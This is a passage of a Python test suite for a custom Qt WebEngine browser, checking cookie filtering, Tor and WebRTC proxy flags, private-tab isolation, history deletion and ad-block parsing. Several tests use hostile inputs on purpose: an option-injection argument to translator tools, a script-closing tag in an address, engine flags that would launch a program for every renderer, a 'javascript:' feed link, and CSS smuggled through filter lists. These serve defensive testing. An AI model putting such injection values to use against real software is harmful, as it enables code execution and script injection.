# "block third-party cookies" holds in a jar made after it was switched on.
# (Asked of the filter itself: over plain http the engine's own SameSite
# default already refuses a cross-site frame's cookie, so the cookie alone
# cannot show whether the filter is there.)
_asked_tp = []
def _rec_filter(request):
    _asked_tp.append((request.firstPartyUrl.toString(), request.thirdParty))
    return True
br._cookie_wanted = _rec_filter
br.config["blockThirdCookies"] = True
br.apply_cookie_filter()
_tpv = br.new_tab(session="tpcookievb"); H.spin(400)
H.load(_tpv, srv.url("/tpframe?latejar=1")); H.spin(1500)
check("the third-party cookie filter is asked in a jar made later",
      any("latejar" in u and third for u, third in _asked_tp),
      str(len(_asked_tp)))
br.__dict__.pop("_cookie_wanted", None)
br.config["blockThirdCookies"] = False
br.apply_cookie_filter()

# the Tor window really goes through Tor: what its own start-up makes of
# its config is a SOCKS proxy, and WebRTC is off in it
import subprocess as _sp
_tor_dir = _xdir / "tor-profile"
_tc = br._prepare_tor_profile(_tor_dir)
check("the Tor profile names Tor as its proxy",
      B._proxy_launch_flags(dict(_tc)) == "--proxy-server=socks5://127.0.0.1:9050",
      B._proxy_launch_flags(dict(_tc)))
_env = dict(_os.environ, BROWSER_HOME=str(_tor_dir),
            QT_QPA_PLATFORM="offscreen",
            QTWEBENGINE_CHROMIUM_FLAGS=br.tor_command()["env"]
            ["QTWEBENGINE_CHROMIUM_FLAGS"])
_child = _sp.run([B.sys.executable, "-c",
                  "import os,sys; sys.argv=['x']; import browser as B; "
                  "B._install_proxy_flags(); "
                  "print(os.environ['QTWEBENGINE_CHROMIUM_FLAGS'])"],
                 cwd=str(B.APP_DIR), env=_env, capture_output=True,
                 text=True, timeout=60)
check("...and the Tor window's own start-up keeps it",
      "--proxy-server=socks5://127.0.0.1:9050" in _child.stdout,
      _child.stdout[-200:] or _child.stderr[-200:])
check("...with WebRTC switched off there",
      _tc.get("guardNoWebRTC") is True)
check("...and kept off at the engine, where the page's own iframe cannot "
      "bring it back",
      "--force-webrtc-ip-handling-policy=disable_non_proxied_udp"
      in B._privacy_flags(dict(_tc)), str(B._privacy_flags(dict(_tc))))

# the in-page answer bars answer his clicks, not the page's
v22 = br.new_tab(); H.spin(300)
H.load(v22, srv.url("/twhome")); H.spin(500)
br.tabs.setCurrentWidget(v22); H.spin(100)
br.offer_fullscreen_rule("127.0.0.1", view=v22); H.spin(400)
H.js(v22, "var b=document.querySelector('#__fsbar button');"
          "b && b.click(); !!b")
H.spin(1200)
check("a page pressing 'keep' on the fullscreen bar earns nothing",
      br.fullscreen_rule("127.0.0.1") is None,
      str(br.fullscreen_rule("127.0.0.1")))
br.offer_translation_bar("fr", view=v22); H.spin(400)
H.js(v22, "var bs=document.querySelectorAll('#__trbar button');"
          "bs.length > 1 && bs[1].click(); bs.length")
H.spin(1200)
check("...nor 'always' on the translation bar",
      "fr" not in br.translate_rules(), str(br.translate_rules()))

# "always translate" does not send a private tab's page to Google by itself
_sent_tr = []
_tp_was = br._translate_page
br._translate_page = lambda lang, view=None: _sent_tr.append(lang)
_ct2 = br.caption_tools
br.caption_tools = lambda: {"captionTranslator": ""}
_rules_was = dict(br.translate_rules())
br.config["translateRules"] = {"fr": "always"}
_pv5 = br.new_private_tab(); H.spin(300)
H.load(_pv5, srv.url("/fr")); H.spin(1500)
br.maybe_offer_translation(_pv5); H.spin(800)
check("a private tab's page is not sent to the translator by itself",
      _sent_tr == [], str(_sent_tr))
br.__dict__.pop("_translate_page", None)
br.__dict__.pop("caption_tools", None)
br.config["translateRules"] = _rules_was

# a workspace keeps the ordinary tabs, never a private one
_pv6 = br.new_private_tab(); H.spin(300)
H.load(_pv6, srv.url("/twother?ws-private")); H.spin(600)
_ws_was = dict(br.workspaces())
_saved_ws = br.save_workspace("review-ws")
check("saving a workspace leaves the private tab out",
      _saved_ws is not False
      and not any("ws-private" in r["u"] for r in _saved_ws), str(_saved_ws)[:200])
br.config["workspaces"] = _ws_was
br.config["workspaceNow"] = ""

# "reddit.com -> old.reddit.com" means the site, once: not www.old.,
# not notreddit.com, and never old.old.reddit.com in a loop
_rw_was = br.config.get("urlRewrites")
br.config["urlRewrites"] = ["reddit.com -> old.reddit.com"]
_rw = lambda u: br.rewrite_url(B.QUrl(u)).toString()
check("a host rule takes the site to the new host",
      _rw("https://www.reddit.com/r/x") == "https://old.reddit.com/r/x"
      and _rw("https://reddit.com/r/y") == "https://old.reddit.com/r/y",
      str((_rw("https://www.reddit.com/r/x"), _rw("https://reddit.com/r/y"))))
check("...and leaves the new host alone (no rewrite loop)",
      _rw("https://old.reddit.com/r/x") == "https://old.reddit.com/r/x",
      _rw("https://old.reddit.com/r/x"))
check("...and a look-alike host alone",
      _rw("https://notreddit.com/") == "https://notreddit.com/",
      _rw("https://notreddit.com/"))
br.config["urlRewrites"] = _rw_was

# live captions listen to the machine's output, not the microphone, and
# what they say is never put into the page
_cp = br._caption_record_args("/usr/bin/parec", "/tmp/x.wav", 3)
_cf = br._caption_record_args("/usr/bin/ffmpeg", "/tmp/x.wav", 3)
check("live captions record the output's monitor",
      "--device=@DEFAULT_MONITOR@" in _cp
      and _cf[_cf.index("-i") + 1] == "@DEFAULT_MONITOR@", str((_cp, _cf)))
br.caption_overlay("words from a call in another program", view=v15)
H.spin(200)
check("...and the caption line is the browser's, not the page's",
      br.caption_text(v15) == "words from a call in another program"
      and H.js(v15, "!!document.getElementById('__captions')") is False)
br.caption_overlay("", view=v15, clear=True)

# page text handed to a translator can never be read as one of its options
class _FakeProc2:
    started = []
    def __init__(self, *a, **k): pass
    def start(self, prog, args): _FakeProc2.started.append([prog] + list(args))
    class _Sig:
        def connect(self, *a): pass
    finished = _Sig()
    errorOccurred = _Sig()
    class ProcessState:
        NotRunning = 0
    def state(self): return 0
_real_qp2 = B.QProcess
B.QProcess = _FakeProc2
for _tool in ("/usr/bin/trans", "/usr/bin/argos-translate", "/opt/mytr"):
    br.caption_tools = lambda t=_tool: {"captionTranslator": t,
                                        "captionRecorder": "",
                                        "captionTranscriber": ""}
    br.run_translator("--output=/tmp/review-pwned")
B.QProcess = _real_qp2
br.__dict__.pop("caption_tools", None)
check("a paragraph that looks like an option is not one",
      len(_FakeProc2.started) == 3
      and all(not row[-1].startswith("-") for row in _FakeProc2.started),
      str(_FakeProc2.started))

# deleting history takes what was kept about those pages with it
_hw = list(br.history)
_pi_was = br.config.get("pageIndex")
br.history[:] = [{"url": "https://gone.example/p", "title": "g", "t": 5},
                 {"url": "https://kept.example/q", "title": "k", "t": 6}]
br.config["pageIndex"] = {"https://gone.example/p": "secret words",
                          "https://kept.example/q": "other words"}
_th = br.thumbs_dir() / (br._thumb_name("https://gone.example/p") + ".png")
_th.parent.mkdir(parents=True, exist_ok=True)
_th.write_bytes(b"png")
br.delete_history_entries(["https://gone.example/p"])
check("deleting a page from the history drops its indexed words and picture",
      list(br.config.get("pageIndex") or {}) == ["https://kept.example/q"]
      and not _th.exists(), str(br.config.get("pageIndex")))
br.clear_history(undoable=False)
check("...and clearing the history drops the whole index",
      not br.config.get("pageIndex"), str(br.config.get("pageIndex")))
_now = int(B.time.time())
br.history[:] = [{"url": "https://old.example/a", "title": "a", "t": _now - 90 * 86400},
                 {"url": "https://again.example/b", "title": "b", "t": _now - 90 * 86400},
                 {"url": "https://again.example/b", "title": "b", "t": _now}]
br.config["pageIndex"] = {"https://old.example/a": "old words",
                          "https://again.example/b": "read again"}
br.prune_history(30)
check("pruning drops the words of a page gone from the history, not of one "
      "read again since", list(br.config["pageIndex"]) ==
      ["https://again.example/b"], str(br.config.get("pageIndex")))
br.history[:] = [{"url": "https://hour.example/c", "title": "c", "t": _now - 60}]
br.config["pageIndex"]["https://hour.example/c"] = "this hour"
br.delete_history_range(since=_now - 3600)
check("...and 'delete the last hour' drops that hour's words",
      "https://hour.example/c" not in br.config["pageIndex"],
      str(br.config.get("pageIndex")))
br.history[:] = _hw
br.config["pageIndex"] = _pi_was or {}

# mono / balance never silence a video from another origin
v23 = br.new_tab(); H.spin(300)
H.load(v23, srv.url("/twovids")); H.spin(800)
_a11y_was = dict(br.config.get("a11y") or {})
br.config.setdefault("a11y", {})["monoAudio"] = True
br.apply_audio_shape(); H.spin(500)
check("a same-origin video is shaped, a cross-origin one is left as it is",
      H.js(v23, "!!document.getElementById('same').__shape") is True
      and H.js(v23, "document.getElementById('other').__shape === undefined")
      is True, str((H.js(v23, "!!document.getElementById('same').__shape"),
                    H.js(v23, "!!document.getElementById('other').__shape"))))
br.config["a11y"] = _a11y_was

# a page's address cannot close the error page's script
_eh = br.error_page_html("http://x.example/</script><script>window.__p=1"
                         "</script>", "boom")
check("an address with </script> in it stays inside the error page's script",
      "</script><script>window.__p" not in _eh, _eh[-300:])

# a site he never records in one virtual browser is not recorded in a tab
# of that browser, whichever browser is in front
v24 = br.new_tab(); H.spin(300)
H.load(v24, srv.url("/twhome")); H.spin(500)
_sess_was = getattr(v24, "session", None)
v24.session = "work"
_nh_was = br.config.get("noHistoryPerSession")
_hist_was, _act_was = list(br.history), br.active_session
br.config["noHistoryPerSession"] = {"work": ["127.0.0.1"]}
br.active_session = "main"
_n = len(br.history)
br._title_changed(v24, "never written")
check("never-record follows the tab's own virtual browser",
      not any(e.get("title") == "never written" for e in br.history),
      str(br.history[-1:]))
br.config["noHistoryPerSession"] = {}
br._title_changed(v24, "written with its browser")
_last = [e for e in br.history if e.get("title") == "written with its browser"]
check("...and the history labels the page with the tab's browser",
      bool(_last) and _last[-1].get("s") == "work", str(_last))
br.history[:] = _hist_was
br.active_session = _act_was
v24.session = _sess_was
if _nh_was is None:
    br.config.pop("noHistoryPerSession", None)
else:
    br.config["noHistoryPerSession"] = _nh_was

# what is kept or copied is the page's title, not the strip's label
v25 = br.new_tab(); H.spin(300)
H.load(v25, srv.url("/twhome")); H.spin(600)
br.tabs.setCurrentWidget(v25); H.spin(100)
_i25 = br.tabs.indexOf(v25)
v25.page().setAudioMuted(True); br._refresh_tab_label(v25); H.spin(100)
_marked = br.tabs.tabText(_i25)
_md = br.copy_link_as("markdown")
_bm_was = list(br.bookmarks)
br.add_bookmark_here(0)
_bm = br.bookmarks[-1] if len(br.bookmarks) > len(_bm_was) else {}
check("a muted tab is bookmarked and copied by its page title",
      _marked.startswith(br.MUTE_MARK) and _bm.get("title") == "tw"
      and _md.startswith("[tw]"), str((_marked, _bm.get("title"), _md)))
br.bookmarks[:] = _bm_was
br.save_bookmarks()
v25.page().setAudioMuted(False); br._refresh_tab_label(v25)
br.pin_tab(br.tabs.indexOf(v25), on=True); H.spin(200)
_st = [e for e in br.tab_state() if e.get("u") == v25.url().toString()]
check("...and a pinned one keeps its title in the saved session",
      br.tabs.tabText(br.tabs.indexOf(v25)) == "" and _st
      and _st[0].get("t") == "tw", str(_st))
br.pin_tab(br.tabs.indexOf(v25), on=False)

# the wizard's "switch it off again" only undoes the wizard's own
# master password, never one he set before and has unlocked
if not br.vault_lock.enabled():
    br._master_by_wizard = False
    _on = br.vault_lock.enable("review-pass-1234")
    br.vault = br.make_vault()
    _after = br.clear_setup_master()
    check("the wizard cannot take off a master password it did not set",
          _on and br.vault_lock.enabled(), str(_after))
    br.vault_lock.disable(); br.vault = br.make_vault()
    _set = br.setup_master("review-pass-5678")
    br.clear_setup_master()
    check("...but does take off the one it set itself",
          _set.get("set") is True and not br.vault_lock.enabled(),
          str((_set, br.vault_lock.enabled())))
    if br.vault_lock.enabled() and not br.vault_lock.locked():
        br.vault_lock.disable()
    br.vault = br.make_vault()

# handing a site to the outside browser never takes a private tab's link
# out of private browsing
_launched = []
_cfg_was = {k: br.config.get(k) for k in ("externalHandoff", "externalSites")}
br.config["externalHandoff"] = True
br.config["externalSites"] = ["handoff.example"]
br._external_which = lambda cmd: "/bin/true"
br._launch_external = lambda cmd, url: _launched.append(url) or True
class _PrivTab:
    private = True
_NT = B.QWebEnginePage.NavigationType
_r_priv = br.maybe_open_external(B.QUrl("https://handoff.example/in"),
                                 _NT.NavigationTypeLinkClicked, _PrivTab())
_r_norm = br.maybe_open_external(B.QUrl("https://handoff.example/in"),
                                 _NT.NavigationTypeLinkClicked, None)
check("a private tab's link is not handed to the outside browser",
      _r_priv is False and _r_norm is True and len(_launched) == 1,
      str((_r_priv, _r_norm, _launched)))
del br._external_which, br._launch_external
for _k, _v in _cfg_was.items():
    if _v is None:
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v

# the Discord routing takes his links, not a page's script, and never a
# private tab's
def _route(**kw):
    try:
        return br.discord_route(srv.url("/twhome"), host="127.0.0.1", **kw)
    except TypeError as _e:
        return "error: %s" % _e
br.config["discordRoute"] = True
_r_script = _route(nav_type=_NT.NavigationTypeOther)
_r_back = _route(nav_type=_NT.NavigationTypeBackForward)
_r_priv = _route(from_view=_PrivTab(), nav_type=_NT.NavigationTypeLinkClicked)
_r_link = _route(nav_type=_NT.NavigationTypeLinkClicked)
check("a page's script cannot push an address into the Discord tab",
      _r_script is False and _r_back is False, str((_r_script, _r_back)))
check("...nor a private tab's link, while his own link still goes there",
      _r_priv is False and _r_link is True, str((_r_priv, _r_link)))
br.config["discordRoute"] = False

# the engine's launch flags: one of each repeated switch, and resolver
# rules that survive Qt splitting the variable at spaces
_mf = getattr(B, "_merge_engine_flags", lambda t: t)
_fl = getattr(B, "_flag", lambda n, v: "%s=%s" % (n, v))
_merged = _mf('--x --enable-features=A --disable-features=C '
              '--enable-features=B,A --host-resolver-rules="MAP a 0.0.0.0" '
              '--disable-features=D --host-resolver-rules="MAP b 1.2.3.4" --y')
check("repeated feature and resolver switches are folded into one each",
      _merged.count("--enable-features=") == 1
      and "--enable-features=A,B" in _merged
      and "--disable-features=C,D" in _merged
      and _merged.count("--host-resolver-rules=") == 1
      and '--host-resolver-rules="MAP a 0.0.0.0,MAP b 1.2.3.4"' in _merged
      and "--x" in _merged and "--y" in _merged, _merged)
check("a blocked site's resolver rule is quoted",
      any(f.startswith('--host-resolver-rules="MAP ads.example 0.0.0.0')
          for f in B._privacy_flags({"blockHosts": ["ads.example"]})),
      str(B._privacy_flags({"blockHosts": ["ads.example"]})))
# ...and measured in an engine of its own: a name mapped by one rule
# still loads with a block list and encrypted DNS beside it, and the
# renderer is told about both features, not only the last one
_child_py = _xdir / "flagchild.py"
_child_py.write_text(r"""
import os, sys, glob
os.environ["QT_QPA_PLATFORM"] = "offscreen"
from PyQt6.QtCore import QTimer, QUrl
from PyQt6.QtWidgets import QApplication
from PyQt6.QtWebEngineWidgets import QWebEngineView
app = QApplication(["x"])
v = QWebEngineView(); v.resize(200, 200); v.show()
me = os.getpid()
def anc(pid):
    for _ in range(8):
        try:
            pp = [l for l in open("/proc/%d/status" % pid) if l.startswith("PPid:")]
        except OSError:
            return False
        pid = int(pp[0].split()[1])
        if pid == me:
            return True
        if pid <= 1:
            return False
    return False
def done(ok):
    feats = ""
    for d in glob.glob("/proc/[0-9]*"):
        try:
            text = open(d + "/cmdline", "rb").read().replace(b"\0", b" ").decode("utf-8", "replace")
        except OSError:
            continue
        if "--type=renderer" in text and anc(int(d.split("/")[-1])):
            feats = " ".join(t for t in text.split() if t.startswith("--enable-features"))
            break
    print("RESULT", v.title(), feats)
    app.quit()
v.loadFinished.connect(done)
v.load(QUrl(sys.argv[1]))
QTimer.singleShot(20000, app.quit)
app.exec()
""")
_port = B.QUrl(srv.url("/twhome")).port()
_env_flags = _mf(" ".join([
    _fl("--host-resolver-rules", "MAP mapped-review.test 127.0.0.1"),
    " ".join(B._privacy_flags({"blockHosts": ["blocked-review.test"],
                               "doh": True,
                               "dohUrl": "https://dns.example/dns-query"})),
    "--enable-features=PlatformHEVCDecoderSupport"]))
_res = _sp.run([B.sys.executable, str(_child_py),
                "http://mapped-review.test:%d/twhome" % _port],
               env=dict(_os.environ, QTWEBENGINE_CHROMIUM_FLAGS=_env_flags),
               capture_output=True, text=True, timeout=90)
_line = ([l for l in _res.stdout.splitlines() if l.startswith("RESULT")]
         or [""])[0]
check("a mapped name loads beside a block list in a real engine",
      _line.startswith("RESULT tw "), _line or _res.stderr[-300:])
check("...and the renderer gets every feature asked for",
      "PlatformHEVCDecoderSupport" in _line and "DnsOverHttps" in _line,
      _line[-300:])
# the curated flags in Settings reach the next start
_sf_was = br.config.get("safeFlags")
br.config["safeFlags"] = ["--enable-zero-copy", "--evil-flag"]
br.save_config()
_sf = B._startup_flags()
check("a curated flag he switched on is put on the engine at start",
      "--enable-zero-copy" in _sf and "--evil-flag" not in _sf, _sf)
if _sf_was is None:
    br.config.pop("safeFlags", None)
else:
    br.config["safeFlags"] = _sf_was
br.save_config()
# an in-app restart hands the next run the flags this one was given
_seen_flags = []
_sd, _inst = B.QProcess.startDetached, B.QApplication.instance
_flags_was = _os.environ.get("QTWEBENGINE_CHROMIUM_FLAGS")
_wait_was = _os.environ.get("BROWSER_RESTART_WAIT")
_srv_was = getattr(br, "_instance_server", None)
class _NoQuit:
    def quit(self):
        pass
try:
    br._instance_server = None
    B.QProcess.startDetached = staticmethod(
        lambda *a, **k: _seen_flags.append(
            _os.environ.get("QTWEBENGINE_CHROMIUM_FLAGS") or "") or True)
    B.QApplication.instance = staticmethod(lambda: _NoQuit())
    _os.environ["QTWEBENGINE_CHROMIUM_FLAGS"] = (
        (_flags_was or "") + " --dns-over-https-mode=secure")
    br.restart()
finally:
    B.QProcess.startDetached, B.QApplication.instance = _sd, _inst
    br._instance_server = _srv_was
    if _flags_was is None:
        _os.environ.pop("QTWEBENGINE_CHROMIUM_FLAGS", None)
    else:
        _os.environ["QTWEBENGINE_CHROMIUM_FLAGS"] = _flags_was
    if _wait_was is None:
        _os.environ.pop("BROWSER_RESTART_WAIT", None)
    else:
        _os.environ["BROWSER_RESTART_WAIT"] = _wait_was
check("an in-app restart does not carry a switched-off flag into the next run",
      _seen_flags and "dns-over-https-mode" not in _seen_flags[0],
      str(_seen_flags))

# a page tool's paint follows the theme, the text he inserts does not
v26 = br.new_tab(); H.spin(300)
H.load(v26, srv.url("/twhome")); H.spin(500)
H.js(v26, "var i=document.createElement('input');i.id='tq';"
          "document.body.appendChild(i);i.focus();true")
_theme_was = B.ACTIVE_THEME
_other = [k for k in B.THEME_INDEX if k != B.DEFAULT_THEME][0]
_text = "#0d0d12 and rgb(205, 214, 244)"
try:
    B.ACTIVE_THEME = _other
    _changed = B.tint_js("x='#0d0d12'") != "x='#0d0d12'"
    br.desk_tool("insert", view=v26, arg=_text); H.spin(400)
finally:
    B.ACTIVE_THEME = _theme_was
_val = H.js(v26, "document.getElementById('tq').value")
check("text inserted into a field is not recoloured by the theme",
      _changed and _val == _text, str((_changed, _val)))

# what he typed on a site is not offered back to it in a private tab
_fh_on = br.config.get("formHistoryOn")
br.config["formHistoryOn"] = True
_fh = br.form_history()
_fh_was = dict(_fh)
_fh["127.0.0.1"] = {"who": ["me@example.invalid"]}
_pv = br.new_tab(private=True); H.spin(300)
H.load(_pv, srv.url("/twhome")); H.spin(500)
_offered_priv = br.offer_form_history(view=_pv)
_offered_norm = br.offer_form_history(view=v26)
check("a private tab is not handed his form history for the site",
      _offered_priv is False and _offered_norm is True,
      str((_offered_priv, _offered_norm)))
_fh.clear(); _fh.update(_fh_was)
if _fh_on is None:
    br.config.pop("formHistoryOn", None)
else:
    br.config["formHistoryOn"] = _fh_on

# a feed's own links are web links or nothing
v27 = br.new_tab(); H.spin(300)
H.load(v27, srv.url("/feedjs.xml")); H.spin(600)
br.read_page_tool("renderfeed", view=v27, arg=False); H.spin(500)
_hrefs = H.js(v27, "Array.prototype.map.call(document.querySelectorAll('a'),"
                   "function(a){return a.getAttribute('href')||''}).join('|')")
check("a feed item's javascript: link is not made a link",
      isinstance(_hrefs, str) and "javascript" not in _hrefs.lower()
      and "https://ok.example/1" in _hrefs, str(_hrefs))

# the words he blurs while streaming are not handed to the page
v28 = br.new_tab(); H.spin(300)
H.load(v28, srv.url("/hooked")); H.spin(500)
br.play_tool("blurprivate", view=v28, arg=["Qwsecretname"]); H.spin(400)
_seen = H.js(v28, "JSON.stringify(window.__seen || [])") or "[]"
_blurred = H.js(v28, "document.getElementById('w').dataset.blurred || ''")
check("the stream-safe words never pass through the page's own functions",
      '"Qwsecretname"' not in _seen and _blurred == "1",
      str((_seen[:200], _blurred)))
br.play_tool("blurprivate", view=v28, arg=False)

# a private tab's cookies stay out of the browser-wide lists
_pk = br.new_tab(private=True); H.spin(300)
H.load(_pk, srv.url("/privck"))
H.wait_for(lambda: any("privonly_review" in str(k)
                       for k in (getattr(br, "_cookie_seen", None) or {})),
           8000)
_names = [n for n, _d, _e in br.known_cookies()]
_rows = [r["host"] for r in br.site_data_rows()
         if "privonly_review" in r.get("names", [])]
_seen_priv = [k for k in (getattr(br, "_cookie_seen", None) or {})
              if "privonly_review" in str(k)]
check("a private tab's cookie is not in the site data or the bridge's list",
      "privonly_review" not in _names and not _rows and _seen_priv,
      str((_names[-5:], _rows, _seen_priv)))
_pjar = br.session_profiles.get(B.PRIVATE_SESSION)
for _t in (br._live_views_on(_pjar) if _pjar is not None else []):
    _ix = br.tabs.indexOf(_t)
    if _ix >= 0:
        br.close_tab(_ix, ask=False)
    else:
        _t._closed = True       # a private view outside this strip
H.spin(600)
br._drop_private_profile(); H.spin(300)
check("...and the cookie editor forgets that jar's rows when it goes",
      not any(str(k).startswith("private|")
              for k in (getattr(br, "_cookie_seen", None) or {})), str([k for k in (getattr(br, "_cookie_seen", None) or {})
                           if str(k).startswith("private|")][:3]))

# one odd line in a filter list no longer switches all hiding off, and a
# brace in a list cannot put a stylesheet of its own on the page
_lists = B.adblock.Rules()
_lists.load_text("##.good\n##.bad:style(color: red)\n"
                 "##x{}#n{display: none}y\n")
_ar, _ao = br.ad_rules, br.ad_block_on
br.ad_rules = lambda: _lists
br.ad_block_on = lambda host=None: True
try:
    v29 = br.new_tab(); H.spin(300)
    H.load(v29, srv.url("/adpage")); H.spin(500)
    br.apply_ad_css(v29); H.spin(400)
    _hid = H.js(v29, "getComputedStyle(document.getElementById('g')).display")
    _col = H.js(v29, "getComputedStyle(document.getElementById('n')).display")
finally:
    br.ad_rules, br.ad_block_on = _ar, _ao
check("a list's hiding rules still hide beside one the engine cannot read",
      _hid == "none", str(_hid))
check("...and a list cannot slip its own CSS onto the page",
      _col != "none", str(_col))

# a filter rule is found for every address it matches, not only for
# those whose words happen to line up with the rule's
_net = B.adblock.Rules()
_net.load_text("adserver.example\n/promoimg\n")
check("a rule whose word sits at its edge still blocks a longer word",
      bool(_net.blocks("https://myadserver.example/x"))
      and bool(_net.blocks("https://x.test/promoimgs/a.png")),
      str((_net.blocks("https://myadserver.example/x"),
           _net.blocks("https://x.test/promoimgs/a.png"))))

# what a recording heard is kept beside it, or not at all -- never in the
# config folder
import glob as _glob, shutil as _shutil
_touch = _shutil.which("touch")
_tools_was = br.record_tools
br.record_tools = lambda: {"recorder": _touch, "ffmpeg": ""}
v30 = br.new_tab(); H.spin(300)
H.load(v30, srv.url("/twhome")); H.spin(500)
br.tabs.setCurrentWidget(v30); H.spin(100)
br.start_recording(view=v30, fps=5, audio=True); H.spin(900)
_out = br.stop_recording(save=True, fmt="gif"); H.spin(300)
_cfg_wavs = _glob.glob(str(B.CONFIG_FILE.parent / "recording-*.wav"))
_beside = bool(_out) and _Path(_out).with_suffix(".wav").exists()
br.start_recording(view=v30, fps=5, audio=True); H.spin(600)
_rec_wav = br.recording_now().audio_path if br.recording_now() else ""
br.stop_recording(save=False); H.spin(300)
br.__dict__.pop("record_tools", None)
check("a recording's sound is kept beside it, and none in the config folder",
      _beside and not _cfg_wavs, str((_out, _cfg_wavs)))
check("...and a recording thrown away takes its sound with it",
      bool(_rec_wav) and not _Path(_rec_wav).exists(), _rec_wav)

# a word looked up in a private tab is looked up in a private tab: not in
# the panel's ordinary jar, and not kept in config.json
_pt = br.new_tab(private=True); H.spin(300)
H.load(_pt, srv.url("/twhome")); H.spin(500)
H.js(_pt, "var r=document.createRange();r.selectNodeContents(document.body);"
          "var s=getSelection();s.removeAllRanges();s.addRange(r);1",
     B.MAIN_WORLD_ID)
_opened, _paneled = [], []
_nt, _op = br.new_tab, br.open_panel
_pu_was = br.config.get("panelUrl")
br.new_tab = lambda *a, **k: _opened.append(k) or object()
br.open_panel = lambda url: _paneled.append(url) or True
try:
    br.translate_selection(view=_pt); H.spin(500)
    br.tabs.setCurrentWidget(_pt); H.spin(100)
    _refused = getattr(br, "_page_to_panel", lambda: "missing")()
finally:
    br.new_tab, br.open_panel = _nt, _op
    br.__dict__.pop("new_tab", None); br.__dict__.pop("open_panel", None)
check("a private tab's translation opens in a private tab, not the panel",
      _opened and _opened[0].get("private") is True and not _paneled
      and br.config.get("panelUrl") == _pu_was, str((_opened, _paneled)))
check("...and a private page is not put into the panel",
      _refused is False and not _paneled, str(_paneled))
_ix = br.tabs.indexOf(_pt)
if _ix >= 0:
    br.close_tab(_ix, ask=False)

# housekeeping runs once while he is away, not on every idle tick
_hk_cleared = []
_hk_profiles = br._all_profiles
class _CacheProbe:
    def clearHttpCache(self):
        _hk_cleared.append(1)
br._all_profiles = lambda profile=None: [_CacheProbe()]
_idle_was = getattr(br, "_idle_since", 0)
br.__dict__.pop("_housekept", None)
br._idle_since = B.time.time() - 600
try:
    br.housekeeping(); br.housekeeping(); br.housekeeping()
finally:
    br.__dict__.pop("_all_profiles", None)
    br._idle_since = _idle_was
check("housekeeping clears the cache once per stretch of idleness",
      len(_hk_cleared) == 1, str(len(_hk_cleared)))

# "cache in memory only" holds on a jar made later, and comes back after
# the developer's cache switch
_ck = B.QWebEngineProfile.HttpCacheType
_cs_was = (br.config.get("cacheSize"), br.config.get("cacheMemoryOnly"))
br.set_cache_size(0, memory_only=True)
_later = br._session_profile("cachelater")
_later_kind = _later.httpCacheType()
v31 = br.new_tab(); H.spin(300)
H.load(v31, srv.url("/twhome")); H.spin(300)
br.cache_off(view=v31, on=True)
br.cache_off(view=v31, on=False)
_back_kind = v31.page().profile().httpCacheType()
br.set_cache_size(_cs_was[0] or 0, memory_only=bool(_cs_was[1]))
check("memory-only cache holds on a virtual browser made afterwards",
      _later_kind == _ck.MemoryHttpCache, str(_later_kind))
check("...and comes back after the developer's no-cache switch",
      _back_kind == _ck.MemoryHttpCache, str(_back_kind))

# lite mode's "no images" holds past the next page
_lite_was = br.config.get("liteMode", False)
v32 = br.new_tab(); H.spin(300)
H.load(v32, srv.url("/twhome")); H.spin(300)
br.lite_mode(on=True)
H.load(v32, srv.url("/twother")); H.spin(500)
_img_on = v32.page().settings().testAttribute(
    B.QWebEngineSettings.WebAttribute.AutoLoadImages)
br.lite_mode(on=_lite_was)
check("lite mode keeps images off after the tab goes to another page",
      _img_on is False, str(_img_on))

# an "&" in a bookmark's name is shown, not taken for a menu shortcut
_amp_entry = {"id": 999901, "type": "link", "title": "AT&T", "parent": 0,
              "url": "https://att.example/", "icon": ""}
_amp_btn = B.BookmarkButton(br, _amp_entry)
_amp_menu = B.QMenu()
br._fill_entries(_amp_menu, [_amp_entry], 0)
check("a bookmark called AT&T keeps its & on the bar and in the menu",
      _amp_btn.text() == "AT&&T" and _amp_menu.actions()[0].text() == "AT&&T",
      str((_amp_btn.text(), _amp_menu.actions()[0].text())))
_amp_btn.deleteLater()

# a muted tab put off as a to-do is written down by its page title
v33 = br.new_tab(); H.spin(300)
H.load(v33, srv.url("/twhome"))
# the page itself, not the start page's load (H.load can return on that)
H.wait_for(lambda: "twhome" in v33.url().toString() and v33.title() == "tw",
           8000)
v33.page().setAudioMuted(True); br._refresh_tab_label(v33); H.spin(100)
_todo_rows = br.tab_to_todo(index=br.tabs.indexOf(v33), close=True) or []
_todo_texts = [r.get("text") for r in _todo_rows]
check("a muted tab's to-do is called by its page title",
      "tw" in _todo_texts and not any(str(t).startswith(br.MUTE_MARK)
                                      for t in _todo_texts), str(_todo_texts))

# zooming in a private tab writes no site into the zoom table
_zs_was = dict(br.config.get("zoomSites") or {})
br.config["zoomSites"] = {}
_pz = br.new_tab(private=True); H.spin(300)
H.load(_pz, srv.url("/twhome")); H.spin(400)
br.tabs.setCurrentWidget(_pz); H.spin(100)
br.zoom_by(1); H.spin(100)
_zoom_rows = dict(br.config.get("zoomSites") or {})
br.config["zoomSites"] = _zs_was
_ix = br.tabs.indexOf(_pz)
if _ix >= 0:
    br.close_tab(_ix, ask=False)
check("zooming a private tab leaves no site in the zoom table",
      not _zoom_rows, str(_zoom_rows))

# a flag line that would start a program of its own never reaches the engine
_cf_was = br.config.get("chromiumFlags")
br.config["chromiumFlags"] = ("--renderer-cmd-prefix=/bin/true\n"
                              "--lang=de --gpu-launcher=/bin/true\n"
                              "--disable-gpu-vsync")
br.save_config()
_flags_now = B._startup_flags()
if _cf_was is None:
    br.config.pop("chromiumFlags", None)
else:
    br.config["chromiumFlags"] = _cf_was
br.save_config()
check("his own flags may not start a program for every renderer",
      "--disable-gpu-vsync" in _flags_now and "cmd-prefix" not in _flags_now
      and "gpu-launcher" not in _flags_now, _flags_now)

# behind a proxy of his, WebRTC stays inside it
_wp = {"webrtcGuard": True, "activeProxy": "mine",
       "proxyProfiles": [{"name": "mine", "type": "socks5",
                          "host": "127.0.0.1", "port": 1080}]}
_with = B._privacy_flags(_wp)
_without = B._privacy_flags({"webrtcGuard": True})
_guard_only = B._privacy_flags(dict(_wp, webrtcGuard=False, guardNoWebRTC=True))
check("with a proxy in use, WebRTC sends no UDP past it",
      any("disable_non_proxied_udp" in f for f in _with)
      and any("default_public_interface_only" in f for f in _without)
      and any("disable_non_proxied_udp" in f for f in _guard_only),
      str((_with, _without, _guard_only)))

# remembering a graphics card never writes over a config that does not
# read, and keeps everything else in one that does
_gr = getattr(B, "_gpu_remember", None)
br.save_config()
